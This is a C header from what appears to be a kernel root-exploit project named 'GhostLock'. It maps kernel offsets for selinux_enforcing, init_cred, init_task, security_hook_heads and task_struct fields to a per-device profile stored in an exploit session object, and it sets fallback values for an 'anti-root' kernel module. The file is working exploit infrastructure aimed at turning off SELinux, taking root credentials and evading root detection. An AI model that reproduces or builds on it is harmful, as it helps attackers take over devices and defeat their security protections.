#ifndef GHOSTLOCK_PROFILE_MACROS_H
#define GHOSTLOCK_PROFILE_MACROS_H

/* The home dir and root script path are read from the session snapshot at
 * every syscall/exec boundary. Keeping the reads inline means the call
 * sites pass stable c_str() pointers exactly where the kernel or exec
 * needs them and nowhere else, and no process-global path state is
 * exposed outside the session (CPP12/SESSION-01). */

#include "common.h"
#include "runtime_struct_offsets.h"

/* Override target.h _OFF macros with the resolved runtime profile. */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define PROFILE_VALUES target_profile_values(&g_exploit_session.profile)
#define SELINUX_ENFORCING_OFF         PROFILE_VALUES->off_selinux_enforcing
#define INIT_CRED_OFF                 PROFILE_VALUES->off_init_cred
#define INIT_TASK_OFF                 PROFILE_VALUES->off_init_task
#define ROOT_TASK_GROUP_OFF           PROFILE_VALUES->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        PROFILE_VALUES->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       PROFILE_VALUES->off_security_hook_heads
#define SLIDE_NFULNL_LOGGER_OFF       PROFILE_VALUES->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         PROFILE_VALUES->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF PROFILE_VALUES->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       PROFILE_VALUES->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

/* VR.ko anti-root fallback defines */
#ifndef VR_TAG_A_OFF
#define VR_TAG_A_OFF           0x06
#endif
#ifndef VR_TAG_B_OFF
#define VR_TAG_B_OFF           0x2c
#endif
#ifndef VR_SYSCALL_TP_FLAG
#define VR_SYSCALL_TP_FLAG     0x400ULL
#endif
#ifndef TASK_THREAD_INFO_FLAGS_OFF
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#endif

#endif
